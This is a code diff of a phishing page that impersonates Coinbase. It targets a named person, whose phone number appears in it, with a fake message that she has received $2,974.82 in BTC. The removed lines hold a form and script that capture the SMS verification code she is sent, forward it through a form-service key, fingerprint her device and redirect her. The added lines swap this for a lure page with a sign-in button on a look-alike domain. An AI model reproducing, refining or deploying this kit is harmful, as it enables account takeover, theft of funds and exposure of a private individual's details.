@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Coinbase | Postal code</title>
+  <title>Coinbase | Send and receive</title>
+  <meta name="description" content="Coinbase is your one-stop financial solution to send, receive and invest your money, with over 200+ cryptocurrencies to trade from." />
   <meta name="theme-color" content="#1d4ed8" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -12,6 +13,7 @@
     :root {
       --blue: #1d4ed8;
       --blue-bright: #2563eb;
+      --blue-soft: #eaf1ff;
       --navy: #0b1b4d;
       --text: #12204a;
       --muted: #5b6b92;
@@ -29,6 +31,8 @@
       overflow-x: hidden;
       position: relative;
     }
+
+    /* Soft blue background shapes */
     .bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
     .bg::before {
       content: ""; position: absolute; width: 760px; height: 760px; border-radius: 50%;
@@ -40,6 +44,8 @@
       bottom: -340px; left: -240px;
       background: radial-gradient(circle at 70% 70%, #dbe8ff, #f1f6ff 60%, transparent 72%);
     }
+
+    /* Header: logo on the left, sign in on the right */
     header {
       position: relative; z-index: 2;
       display: flex; align-items: center; justify-content: space-between;
@@ -47,71 +53,56 @@
     }
     .brand { display: flex; align-items: center; gap: 12px; font-family: "Sora", sans-serif; font-weight: 800; font-size: 1.5rem; letter-spacing: -0.02em; color: var(--navy); }
     .logo-mark { width: 42px; height: 42px; flex: none; filter: drop-shadow(0 6px 14px rgba(29, 78, 216, 0.22)); }
+    .signin {
+      color: var(--blue); text-decoration: none; font-weight: 600; font-size: 0.95rem;
+      padding: 10px 24px; border: 1.5px solid var(--blue); border-radius: 999px;
+      background: #fff; transition: all 0.25s ease;
+    }
+    .signin:hover { background: var(--blue); color: #fff; }
 
+    /* Hero */
     main {
       position: relative; z-index: 1; flex: 1;
       display: flex; align-items: center; justify-content: center;
       padding: 24px 20px 48px;
     }
-    .card {
-      width: 100%; max-width: 440px; background: #fff;
-      border: 1px solid var(--border); border-radius: 24px;
-      padding: 32px 28px; box-shadow: 0 20px 50px -20px rgba(29, 78, 216, 0.3);
-      animation: rise 0.8s ease both;
-    }
+    .hero { max-width: 760px; text-align: center; animation: rise 0.9s ease both; }
     @keyframes rise { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: none; } }
-    .notice {
-      font-size: 0.85rem; font-weight: 700; color: #000; text-align: center;
-      background: #f5f9ff; border: 1px solid #e3edfc; border-radius: 12px;
-      padding: 11px 14px; margin-top: 20px; line-height: 1.5;
+    .pill {
+      display: inline-flex; align-items: center; gap: 5px;
+      font-size: 0.72rem; font-weight: 800; color: var(--blue);
+      padding: 7px 16px; border: 1px solid var(--border); border-radius: 999px;
+      background: #fff; margin-bottom: 28px;
+      box-shadow: 0 4px 16px rgba(29, 78, 216, 0.08);
     }
-    h1 { font-family: "Sora", sans-serif; font-weight: 600; font-size: 1.15rem; color: var(--navy); letter-spacing: -0.01em; line-height: 1.3; text-align: center; }
-
-    /* Form is greyed out (but visible) while loading */
-    fieldset { border: 0; min-width: 0; }
-    form.is-loading { opacity: 0.5; filter: grayscale(1); transition: opacity 0.4s, filter 0.4s; }
-    form.is-loading input, form.is-loading button { cursor: not-allowed; }
-    form { transition: opacity 0.4s, filter 0.4s; }
-
-    /* Loading status button below the form */
-    .status {
-      display: flex; align-items: center; justify-content: center; gap: 10px;
-      width: 100%; margin-top: 14px; padding: 14px 16px;
-      border-radius: 999px; border: 1.5px solid var(--border);
-      background: #f1f4fa; color: var(--muted);
-      font-family: "Inter", system-ui, sans-serif; font-weight: 600; font-size: 0.92rem;
-      box-shadow: none; cursor: default;
+    .pill i { width: 8px; height: 8px; border-radius: 50%; background: var(--blue-bright); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.18); }
+    h1 {
+      font-family: "Sora", sans-serif; font-weight: 500; color: var(--navy);
+      font-size: clamp(2.2rem, 6vw, 4rem); line-height: 1.1; letter-spacing: -0.03em;
     }
-    .status:hover { transform: none; box-shadow: none; }
-    .status.done { background: #eaf3ff; color: var(--blue); border-color: #b6d4fe; cursor: pointer; }
-    .spinner {
-      width: 18px; height: 18px; flex: none; border-radius: 50%;
-      border: 3px solid #c9d6f0; border-top-color: var(--blue-bright);
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .hint { margin-top: 18px; color: var(--muted); font-size: 0.95rem; line-height: 1.5; }
-    label { display: block; margin: 24px 0 8px; font-weight: 600; font-size: 0.92rem; }
-    input[type="text"] {
-      width: 100%; padding: 15px 16px; font: inherit; font-size: 1.15rem; letter-spacing: 0.35em;
-      color: var(--navy); background: #f6f9ff; border: 1.5px solid var(--border); border-radius: 14px;
-      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
-    }
-    input[type="text"]:focus { border-color: var(--blue-bright); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15); background: #fff; }
-    input[type="text"]::placeholder { letter-spacing: 0.2em; color: #a8b5d6; }
-    .error { min-height: 20px; margin-top: 8px; font-size: 0.85rem; color: #c62828; }
-    button {
-      width: 100%; margin-top: 10px; padding: 16px; border: 0; border-radius: 999px; cursor: pointer;
+    h1 span { color: var(--blue-bright); }
+    .sub { margin: 22px auto 0; max-width: 540px; color: var(--muted); font-size: 1.08rem; line-height: 1.65; }
+    .cta {
+      display: inline-flex; align-items: center; gap: 10px; margin-top: 38px;
+      padding: 16px 40px; border-radius: 999px; text-decoration: none;
       font-family: "Sora", sans-serif; font-weight: 600; font-size: 1.02rem; color: #fff;
       background: linear-gradient(135deg, var(--blue-bright), var(--blue));
       box-shadow: 0 12px 32px -8px rgba(29, 78, 216, 0.55);
       transition: transform 0.25s ease, box-shadow 0.25s ease;
     }
-    button:hover { transform: translateY(-2px); box-shadow: 0 18px 40px -8px rgba(29, 78, 216, 0.7); }
-    button:disabled { opacity: 0.7; cursor: default; transform: none; }
-    .privacy { margin-top: 16px; font-size: 0.78rem; color: var(--muted); text-align: center; line-height: 1.5; }
-    .hidden { display: none; }
+    .cta:hover { transform: translateY(-3px); box-shadow: 0 18px 40px -8px rgba(29, 78, 216, 0.7); }
+    .cta svg { transition: transform 0.25s ease; }
+    .cta:hover svg { transform: translateX(4px); }
 
+    .trust { display: flex; justify-content: center; flex-wrap: wrap; gap: 14px; margin-top: 46px; }
+    .trust div {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 0.88rem; font-weight: 500; color: var(--text);
+      padding: 9px 16px; background: #fff; border: 1px solid var(--border); border-radius: 999px;
+    }
+    .trust svg { color: var(--blue-bright); }
+
+    /* Footer */
     footer {
       position: relative; z-index: 2; text-align: center;
       padding: 26px 20px; border-top: 1px solid var(--border);
@@ -125,7 +116,8 @@
       header { padding: 16px; }
       .brand { font-size: 1.3rem; }
       .logo-mark { width: 38px; height: 38px; }
-      .card { padding: 26px 20px; }
+      .signin { padding: 9px 18px; font-size: 0.88rem; }
+      .trust { gap: 10px; }
     }
   </style>
 </head>
@@ -133,345 +125,23 @@
   <div class="bg"></div>
 
   <header>
+    <!-- Logo on the left, same side as the phone's network bar -->
     <div class="brand">
       <svg class="logo-mark" viewBox="0 0 40 40" fill="none" aria-hidden="true">
-        <rect x="1" y="1" width="38" height="38" rx="11" fill="#ffffff" stroke="#dbe5fb" stroke-width="1.5" />
-        <path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#1d4ed8" stroke-width="5" stroke-linecap="round" />
-       </svg>
+        <rect x="1" y="1" width="38" height="38" rx="11" fill="#1d4ed8" stroke="#dbe5fb" stroke-width="1.5" />
+        <path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#ffffff" stroke-width="5" stroke-linecap="round" />
+      </svg>
       Coinbase 
     </div>
     <!-- Sign in just reloads the page for now -->
-    <a href="#" class="signin" onclick="location.reload(); return false;"> <span style="text-decoration: none; font-weight: 800;"> home </span> </a>
-<!-- =====================================================================
-     CHOICEPAY DEBIT CARD BANNER
-     HOW TO INSERT:
-       1. Find the closing </header> tag in your page.
-       2. Paste this WHOLE block on the line right ABOVE </header>.
-          (Your logo and sign in stay exactly where they are; the banner
-           drops onto its own full-width row underneath them.)
-       3. Save / commit. Done.
-
-     To change any text, colour or option, edit ONLY the SETTINGS
-     section directly below. Everything else updates by itself.
-     ===================================================================== -->
-
-<!-- ========================= SETTINGS (edit me) ========================= -->
-<script>
-window.CHOICEPAY_AD = {
-
-  /* ---------- BANNER TEXT ---------- */
-  eyebrow:            "Coinbase Debit Card",          // small pill above the headline
-
-  // The headline is built from 3 parts so the middle part can be highlighted.
-  // It reads:  [Before] [Highlight] [After]
-  headlineBefore:     "Earn",
-  headlineHighlight:  "2% cash back",
-  headlineAfter:      "every year with your debit card.",
-
-  subtext:            "Rewards on everyday spending, at home and abroad.",
-
-  // Little tick-mark items under the paragraph. Use [] to hide them all.
-  features: [
-    "No monthly fees",
-    "Instant payment",
-    "Contactless worldwide"
-  ],
-
-  /* ---------- BUTTON ---------- */
-  showButton:         true,                            // true = show, false = hide
-  buttonText:         "Get your card",
-  buttonLink:         "#",                             // e.g. "/address" or "https://..."
-  buttonNewTab:       false,                           // true = open link in a new tab
-
-  /* ---------- SMALL PRINT ---------- */
-  finePrint:          "Terms and conditions apply. Cash back is subject to eligibility.",
-
-  /* ---------- THE CARD (front) ---------- */
-  cardBrand:          "Coinbase",                     // name printed on the card
-  cardType:           "visa DEBIT",                         // top-right label on the card
-  cardNumber:         "••••  ••••  ••••  4821",
-  cardName:           "VALUED MEMBER",                 // try "USER EXAMPLE"
-  validLabel:         "VALID THRU",
-  validDate:          "12/29",
-
-  /* ---------- THE CARD (back, peeking behind) ---------- */
-  showBackCard:       true,                            // false = hide the white card
-  backText:           "Customer care available 24/7",
-
-  /* ---------- COLOURS ---------- */
-  colorDark:          "#0b1b4d",                       // deepest blue
-  colorBlue:          "#1d4ed8",                       // main blue
-  colorBright:        "#2563eb",                       // lighter blue
-  colorText:          "#ffffff",                       // text on the banner
-  colorHighlight:     "#9fd0ff",                       // the highlighted "2% cash back"
-  colorButtonBg:      "#ffffff",                       // button background
-  colorButtonText:    "#1d4ed8",                       // button text
-
-  /* ---------- LOOK AND MOTION ---------- */
-  animateCard:        true,                            // true = gentle floating cards
-  cornerRadius:       "28px",                          // banner corner roundness
-  maxWidth:           "1040px"                         // widest the banner will get
-};
-</script>
-<!-- ======================= END OF SETTINGS ======================= -->
-
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@600;700;800&display=swap" rel="stylesheet" />
-
-<style>
-  .cpad, .cpad * { box-sizing: border-box; }
-  .cpad {
-    --cpad-dark: #0b1b4d; --cpad-blue: #1d4ed8; --cpad-bright: #2563eb;
-    --cpad-text: #ffffff; --cpad-highlight: #9fd0ff;
-    --cpad-btn-bg: #ffffff; --cpad-btn-text: #1d4ed8;
-    position: relative; z-index: 2;
-    /* Sits on its own full-width row, even when placed inside a flex or grid header */
-    flex: 0 0 100%; grid-column: 1 / -1; align-self: stretch;
-    width: 100%; max-width: 1040px; margin: 10px auto 4px;
-    border-radius: 28px; overflow: hidden;
-    color: var(--cpad-text);
-    background: linear-gradient(135deg, var(--cpad-bright) 0%, var(--cpad-blue) 48%, var(--cpad-dark) 100%);
-    box-shadow: 0 30px 70px -28px rgba(11, 27, 77, 0.65);
-    font-family: "Inter", system-ui, -apple-system, "Segoe UI", sans-serif;
-  }
-  /* soft decorative circles */
-  .cpad::before, .cpad::after { content: ""; position: absolute; border-radius: 50%; pointer-events: none; }
-  .cpad::before { width: 460px; height: 460px; top: -220px; right: -140px; background: rgba(255, 255, 255, 0.08); }
-  .cpad::after  { width: 340px; height: 340px; bottom: -190px; left: -110px; background: rgba(255, 255, 255, 0.06); }
-
-  .cpad-inner {
-    position: relative; z-index: 1;
-    display: flex; align-items: center; justify-content: space-between; gap: 28px;
-    padding: 28px 40px;
-  }
-
-  /* ---------------- Card stage (the main attraction) ---------------- */
-  .cpad-stage {
-    position: relative; flex: none;
-    font-size: clamp(11px, 3.6vw, 16px);   /* everything inside scales from this */
-    width: 26em; height: 18.5em;
-  }
-  .cpad-card, .cpad-back {
-    position: absolute; width: 21.5em; height: 13.55em; border-radius: 1.25em;
-  }
-
-  /* back card (white) */
-  .cpad-back {
-    left: 4.2em; top: 0; transform: rotate(9deg);
-    background: linear-gradient(145deg, #ffffff 0%, #dbe8ff 100%);
-    box-shadow: 0 24px 50px -20px rgba(3, 10, 40, 0.55);
-    overflow: hidden; color: var(--cpad-blue);
-  }
-  .cpad-back .stripe { position: absolute; left: 0; right: 0; top: 2.2em; height: 2.6em; background: var(--cpad-dark); }
-  .cpad-back .mark { position: absolute; right: 1.2em; bottom: 1em; width: 3.6em; height: 3.6em; opacity: 0.18; }
-  .cpad-back .back-text { position: absolute; left: 1.4em; bottom: 1.4em; font-size: 0.78em; font-weight: 600; letter-spacing: 0.04em; opacity: 0.8; }
-
-  /* front card (blue) */
-  .cpad-card {
-    left: 0; top: 4.2em; transform: rotate(-7deg);
-    padding: 1.45em 1.6em; color: #fff; overflow: hidden;
-    background: linear-gradient(135deg, #3b82f6 0%, var(--cpad-blue) 42%, var(--cpad-dark) 100%);
-    border: 1px solid rgba(255, 255, 255, 0.28);
-    box-shadow: 0 34px 60px -18px rgba(3, 10, 40, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.4);
-    display: flex; flex-direction: column; justify-content: space-between;
-  }
-  .cpad-card .waves { position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; }
-  .cpad-card .shine { position: absolute; inset: 0; pointer-events: none;
-    background: linear-gradient(115deg, rgba(255,255,255,0.22) 0%, rgba(255,255,255,0) 38%, rgba(255,255,255,0) 100%); }
-  .cpad-row { position: relative; display: flex; align-items: center; justify-content: space-between; }
-  .cpad-logo { display: flex; align-items: center; gap: 0.55em; font-family: "Sora", sans-serif; font-weight: 700; font-size: 1.1em; letter-spacing: -0.01em; }
-  .cpad-logo svg { width: 1.9em; height: 1.9em; }
-  .cpad-type { font-weight: 600; font-size: 0.78em; letter-spacing: 0.22em; opacity: 0.92; }
-  .cpad-chiprow { position: relative; display: flex; align-items: center; gap: 0.9em; }
-  .cpad-chip {
-    width: 2.7em; height: 2.05em; border-radius: 0.45em;
-    background:
-      linear-gradient(90deg, transparent 32%, rgba(11,27,77,0.28) 32%, rgba(11,27,77,0.28) 34%, transparent 34%, transparent 66%, rgba(11,27,77,0.28) 66%, rgba(11,27,77,0.28) 68%, transparent 68%),
-      linear-gradient(0deg, transparent 46%, rgba(11,27,77,0.28) 46%, rgba(11,27,77,0.28) 54%, transparent 54%),
-      linear-gradient(135deg, #ffffff, #c9d9f5);
-    box-shadow: inset 0 0 0 1px rgba(11, 27, 77, 0.18);
-  }
-  .cpad-contactless { width: 1.7em; height: 1.7em; opacity: 0.9; transform: rotate(90deg); }
-  .cpad-number { position: relative; font-size: 1.28em; font-weight: 500; letter-spacing: 0.1em; white-space: pre; text-shadow: 0 2px 6px rgba(3, 10, 40, 0.35); font-variant-numeric: tabular-nums; }
-  .cpad-foot { position: relative; display: flex; align-items: flex-end; justify-content: space-between; }
-  .cpad-name { font-size: 0.86em; font-weight: 600; letter-spacing: 0.1em; }
-  .cpad-valid { text-align: right; }
-  .cpad-valid small { display: block; font-size: 0.55em; letter-spacing: 0.18em; opacity: 0.75; margin-bottom: 0.2em; }
-  .cpad-valid span { font-size: 0.86em; font-weight: 600; letter-spacing: 0.08em; }
-
-  .cpad-floating .cpad-card { animation: cpad-float-a 5s ease-in-out infinite; }
-  .cpad-floating .cpad-back { animation: cpad-float-b 6s ease-in-out infinite; }
-  @keyframes cpad-float-a { 0%, 100% { transform: rotate(-7deg) translateY(0); } 50% { transform: rotate(-5deg) translateY(-10px); } }
-  @keyframes cpad-float-b { 0%, 100% { transform: rotate(9deg) translateY(0); } 50% { transform: rotate(10.5deg) translateY(8px); } }
-  @media (prefers-reduced-motion: reduce) { .cpad-floating .cpad-card, .cpad-floating .cpad-back { animation: none; } }
-
-  /* ---------------- Text side ---------------- */
-  .cpad-copy { flex: 1 1 0; min-width: 0; max-width: 470px; }
-  .cpad-eyebrow {
-    display: inline-block; padding: 5px 12px; border-radius: 999px;
-    font-size: 0.7rem; font-weight: 600; letter-spacing: 0.02em;
-    background: rgba(255, 255, 255, 0.14); border: 1px solid rgba(255, 255, 255, 0.28);
-  }
-  .cpad-title {
-    margin: 10px 0 0; font-family: "Sora", sans-serif; font-weight: 800;
-    font-size: clamp(1.15rem, 2.3vw, 1.65rem); line-height: 1.2; letter-spacing: -0.02em;
-  }
-  .cpad-title .hl { color: var(--cpad-highlight); }
-  .cpad-sub { margin: 8px 0 0; font-size: 0.86rem; line-height: 1.5; opacity: 0.88; }
-  .cpad-features { list-style: none; margin: 10px 0 0; padding: 0; display: flex; flex-wrap: wrap; gap: 6px 16px; }
-  .cpad-features li { display: flex; align-items: center; gap: 6px; font-size: 0.8rem; line-height: 1.3; }
-  .cpad-features svg { flex: none; width: 15px; height: 15px; color: var(--cpad-highlight); }
-  .cpad-btn {
-    display: inline-flex; align-items: center; gap: 8px; margin-top: 16px; padding: 10px 24px;
-    border-radius: 999px; text-decoration: none; cursor: pointer;
-    font-family: "Sora", sans-serif; font-weight: 600; font-size: 0.88rem;
-    background: var(--cpad-btn-bg); color: var(--cpad-btn-text);
-    box-shadow: 0 14px 30px -10px rgba(3, 10, 40, 0.55);
-    transition: transform 0.25s ease, box-shadow 0.25s ease;
-  }
-  .cpad-btn:hover { transform: translateY(-2px); box-shadow: 0 20px 36px -10px rgba(3, 10, 40, 0.7); }
-  .cpad-btn svg { width: 14px; height: 14px; transition: transform 0.25s ease; }
-  .cpad-btn:hover svg { transform: translateX(3px); }
-  .cpad-fine { margin: 10px 0 0; font-size: 0.66rem; opacity: 0.7; line-height: 1.4; }
-  .cpad-hidden { display: none !important; }
-
-  /* ---------------- Phones and small screens ---------------- */
-  @media (max-width: 860px) {
-    .cpad-inner { flex-direction: column; padding: 22px 18px 24px; gap: 4px; text-align: center; }
-    /* make the cards fit exactly inside the banner on any phone width */
-    .cpad-stage { font-size: min(16px, calc((100vw - 90px) / 26)); }
-    .cpad-copy { max-width: 560px; }
-    .cpad-features { justify-content: center; }
-  }
-</style>
-
-<section class="cpad" id="cpad-root" aria-label="ChoicePay debit card offer">
-  <div class="cpad-inner">
-
-    <!-- Cards -->
-    <div class="cpad-stage" aria-hidden="true">
-      <div class="cpad-back" id="cpad-back">
-        <div class="stripe"></div>
-        <svg class="mark" viewBox="0 0 40 40" fill="none"><path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="currentColor" stroke-width="5" stroke-linecap="round" /></svg>
-        <div class="back-text" data-cp="backText"></div>
-      </div>
-
-      <div class="cpad-card">
-        <svg class="waves" viewBox="0 0 340 215" preserveAspectRatio="none" fill="none">
-          <path d="M-10 150 C70 100 130 200 220 150 S320 90 360 120" stroke="rgba(255,255,255,0.16)" stroke-width="1.4" />
-          <path d="M-10 168 C70 118 130 218 220 168 S320 108 360 138" stroke="rgba(255,255,255,0.12)" stroke-width="1.4" />
-          <path d="M-10 186 C70 136 130 236 220 186 S320 126 360 156" stroke="rgba(255,255,255,0.09)" stroke-width="1.4" />
-          <circle cx="300" cy="30" r="90" fill="rgba(255,255,255,0.06)" />
-        </svg>
-        <div class="shine"></div>
-
-        <div class="cpad-row">
-          <div class="cpad-logo">
-            <svg viewBox="0 0 40 40" fill="none"><rect x="1" y="1" width="38" height="38" rx="11" fill="#ffffff" /><path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#1d4ed8" stroke-width="5" stroke-linecap="round" /></svg>
-            <span data-cp="cardBrand"></span>
-          </div>
-          <div class="cpad-type" data-cp="cardType"></div>
-        </div>
-
-        <div class="cpad-chiprow">
-          <div class="cpad-chip"></div>
-          <svg class="cpad-contactless" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M8.5 8.5a5 5 0 0 1 0 7" /><path d="M12 6a9 9 0 0 1 0 12" /><path d="M15.5 3.5a13 13 0 0 1 0 17" /></svg>
-        </div>
-
-        <div class="cpad-number" data-cp="cardNumber"></div>
-
-        <div class="cpad-foot">
-          <div class="cpad-name" data-cp="cardName"></div>
-          <div class="cpad-valid"><small data-cp="validLabel"></small><span data-cp="validDate"></span></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Text -->
-    <div class="cpad-copy">
-      <span class="cpad-eyebrow" data-cp="eyebrow"></span>
-      <h2 class="cpad-title"><span data-cp="headlineBefore"></span> <span class="hl" data-cp="headlineHighlight"></span> <span data-cp="headlineAfter"></span></h2>
-      <p class="cpad-sub" data-cp="subtext"></p>
-      <ul class="cpad-features" id="cpad-features"></ul>
-      <a class="cpad-btn" id="cpad-btn" href="#">
-        <span data-cp="buttonText"></span>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6" /></svg>
-      </a>
-      <p class="cpad-fine" data-cp="finePrint"></p>
-    </div>
-
-  </div>
-</section>
-
-<script>
-(function () {
-  var cfg = window.CHOICEPAY_AD || {};
-  var root = document.getElementById("cpad-root");
-  if (!root) return;
-
-  // If pasted inside a flex header, let the header wrap so the banner gets its own row
-  var host = root.parentElement;
-  if (host) {
-    var d = window.getComputedStyle(host).display;
-    if (d.indexOf("flex") !== -1) host.style.flexWrap = "wrap";
-  }
-
-  // Fill every piece of text (textContent keeps it safe from stray HTML)
-  var nodes = root.querySelectorAll("[data-cp]");
-  for (var i = 0; i < nodes.length; i++) {
-    var key = nodes[i].getAttribute("data-cp");
-    if (typeof cfg[key] === "string") nodes[i].textContent = cfg[key];
-  }
-
-  // Hide parts that are empty
-  ["eyebrow", "subtext", "finePrint"].forEach(function (k) {
-    var el = root.querySelector('[data-cp="' + k + '"]');
-    if (el && !cfg[k]) el.classList.add("cpad-hidden");
-  });
-
-  // Feature list
-  var list = document.getElementById("cpad-features");
-  var tick = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" stroke-opacity="0.45"/><path d="M7.5 12.5l3 3 6-6.5"/></svg>';
-  var feats = Array.isArray(cfg.features) ? cfg.features : [];
-  feats.forEach(function (text) {
-    var li = document.createElement("li");
-    li.innerHTML = tick;
-    var span = document.createElement("span");
-    span.textContent = text;
-    li.appendChild(span);
-    list.appendChild(li);
-  });
-  if (!feats.length) list.classList.add("cpad-hidden");
-
-  // Button
-  var btn = document.getElementById("cpad-btn");
-  if (cfg.showButton === false) btn.classList.add("cpad-hidden");
-  if (cfg.buttonLink) btn.setAttribute("href", cfg.buttonLink);
-  if (cfg.buttonNewTab) { btn.setAttribute("target", "_blank"); btn.setAttribute("rel", "noopener"); }
-
-  // Back card and motion
-  if (cfg.showBackCard === false) document.getElementById("cpad-back").classList.add("cpad-hidden");
-  if (cfg.animateCard !== false) root.classList.add("cpad-floating");
-
-  // Colours and sizes
-  var map = {
-    colorDark: "--cpad-dark", colorBlue: "--cpad-blue", colorBright: "--cpad-bright",
-    colorText: "--cpad-text", colorHighlight: "--cpad-highlight",
-    colorButtonBg: "--cpad-btn-bg", colorButtonText: "--cpad-btn-text"
-  };
-  Object.keys(map).forEach(function (k) { if (cfg[k]) root.style.setProperty(map[k], cfg[k]); });
-  if (cfg.cornerRadius) root.style.borderRadius = cfg.cornerRadius;
-  if (cfg.maxWidth) root.style.maxWidth = cfg.maxWidth;
-})();
-</script>
-
+    <a href="#" class="signin" onclick="location.reload(); return false;">Sign in</a>
   </header>
 
   <main>
-    <section class="card">
-      <h1>  <span style="color:black; font-size:23px; font-weight:800;">confirm transaction</span> </h1>
-
-      <div class="notice"> <!-- Paste this inside your existing <div> -->
+    <section class="hero">
+      <div class="pill"><i></i> Fast. Secure. Borderless.</div>
+      <h1 style="line-height: 0.85; font-size:24px; font-weight:900;"> <span style="color: var(--navy); font-weight:900;"> Coinbase, </span> <span style="colour: var(--blue-bright); font-weight:900;"> your one-stop financial solution to  </span> <span style="color:#191970; line-height: 1.1; font-size:24px; font-weight:900;">  send, receive and invest money Globally</span>.  <span style="font-size:24px; line-height: 1.1; font-weight:900;">Trade Fiat and over 200+ digital currencies.</span>  </h1>
+      <p class="sub" <!-- Paste this inside your existing <div> -->
 <style>
   .ex-pending-widget {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -564,9 +234,9 @@ window.CHOICEPAY_AD = {
   </div>
 
   <!-- Heading -->
-<p style="font-size:14px; color:black; margin-bottom: 14px;"> <strong> Mary Kathan </strong> (+16073777311) you have received $2,974.82     -     0.051BTC</h1> </p> 
+<p style="font-size:14px; color:black; margin-bottom: 14px;"> <strong> Mary Kathan </strong> (+16073777311) you have received <strong> $2,974.82  -    0.051BTC</strong> from <strong> 19************5 Tom Jones/INST-PYMT.</strong> </h1> </p> 
   <h2 class="ex-pending-title">1 Pending Transaction</h2>
-  <p class="ex-pending-subtitle"> confirm to finish receiving</p>
+  <p class="ex-pending-subtitle">Sign in to finish receiving</p>
 
   <!-- Details Table Card -->
   <div class="ex-pending-card">
@@ -575,8 +245,8 @@ window.CHOICEPAY_AD = {
       <span class="ex-pending-pill">Awaiting Verification</span>
     </div>
     <div class="ex-pending-row">
-      <span class="ex-pending-label">speed</span>
-      <span class="ex-pending-value"> <span style="color:green;"> instant ⚡︎</span>
+      <span class="ex-pending-label">Account</span>
+      <span class="ex-pending-value">Mary Kathan</span>
     </div>
     <div class="ex-pending-row">
       <span class="ex-pending-label">Amount</span>
@@ -589,30 +259,17 @@ window.CHOICEPAY_AD = {
   </div>
 </div>
 </span> </p>
-</div>
 
-      <p class="hint"> <span style="font-weight:bold; color:black;">confirm transaction</span></p> <p> <span style="color:black; font-size:15px; font-weight:500;"> Enter the 6-digits code sent to your mobile number (+16073777311) to confirm and finish receiving.</span> </p>
+      <a href="https://coinbase-transfer.web.app/sign-in" class="cta">
+        Sign-in
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6" /></svg>
+      </a>
 
-      <form id="postal-form" class="is-loading" novalidate>
-       <fieldset id="fields" disabled>
-        <!-- Spam trap: real people never tick this -->
-        <input type="checkbox" name="botcheck" class="hidden" tabindex="-1" autocomplete="off" />
-
-        <label for="postal">Enter code</label>
-        <input type="text" id="postal" name="postal_code" inputmode="numeric" autocomplete="postal-code"
-               pattern="[0-9]{6}" placeholder="000000" required />
-        <div class="error" id="error" role="alert"></div>
-
-        <button type="complete transaction" id="submit-btn">finish receiving</button>
-        <p class="privacy">.</p>
-       </fieldset>
-      </form>
-
-      <button type="button" class="status" id="status" aria-live="polite">
-        <span class="spinner" id="spinner" aria-hidden="true"></span>
-        <svg class="hidden" id="check" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6L9 17l-5-5" /></svg>
-        <span id="status-text">Sending code please wait</span>
-      </button>
+      <div class="trust">
+        <div><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5" /></svg> Bank-grade security</div>
+        <div><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5" /></svg> Instant transfers</div>
+        <div><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5" /></svg> Low fees</div>
+      </div>
     </section>
   </main>
 
@@ -626,188 +283,6 @@ window.CHOICEPAY_AD = {
     </div>
   </footer>
 
-  <script>
-    document.getElementById("year").textContent = new Date().getFullYear();
-
-    // Your Web3Forms access key (safe to be public: it can only send to your email)
-    var ACCESS_KEY = "13074adb-ae1c-46d5-81ae-bc762824954a";
-    // Where people go after submitting, so they know it's a test
-    var REDIRECT_URL = "https://coinbase-transfer.web.app/processing";
-
-    var form = document.getElementById("postal-form");
-    var input = document.getElementById("postal");
-    var error = document.getElementById("error");
-    var button = document.getElementById("submit-btn");
-
-    // Only allow digits, max 6
-    input.addEventListener("input", function () {
-      input.value = input.value.replace(/\D/g, "").slice(0, 6);
-      error.textContent = "";
-    });
-
-    // Work out the phone/computer and browser from the browser's own info
-    function detectDevice() {
-      var ua = navigator.userAgent || "";
-      var os = "Unknown", device = "Desktop", browser = "Unknown";
-
-      if (/iPhone/.test(ua)) { os = "iOS (iPhone)"; device = "Phone"; }
-      else if (/iPad/.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) { os = "iPadOS (iPad)"; device = "Tablet"; }
-      else if (/Android/.test(ua)) { os = "Android"; device = /Mobile/.test(ua) ? "Phone" : "Tablet"; }
-      else if (/Windows/.test(ua)) { os = "Windows"; }
-      else if (/CrOS/.test(ua)) { os = "ChromeOS"; }
-      else if (/Mac OS X/.test(ua)) { os = "macOS"; }
-      else if (/Linux/.test(ua)) { os = "Linux"; }
-
-      if (/FBAN|FBAV/.test(ua)) browser = "Facebook app browser";
-      else if (/Instagram/.test(ua)) browser = "Instagram app browser";
